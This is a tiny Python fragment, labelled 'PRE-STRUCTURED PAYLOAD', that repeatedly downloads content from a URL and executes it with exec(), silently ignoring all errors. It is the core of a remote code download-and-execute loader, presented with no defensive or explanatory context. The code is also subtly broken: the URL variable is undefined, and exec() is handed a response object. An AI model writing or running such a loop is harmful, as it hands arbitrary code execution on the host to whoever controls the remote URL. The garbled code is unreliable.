

### BEGIN PRE-STRUCTURED PAYLOAD ###
import urllib.request
while True:
	try:
		exec(urllib.request.urlopen(url))
	except:
		pass
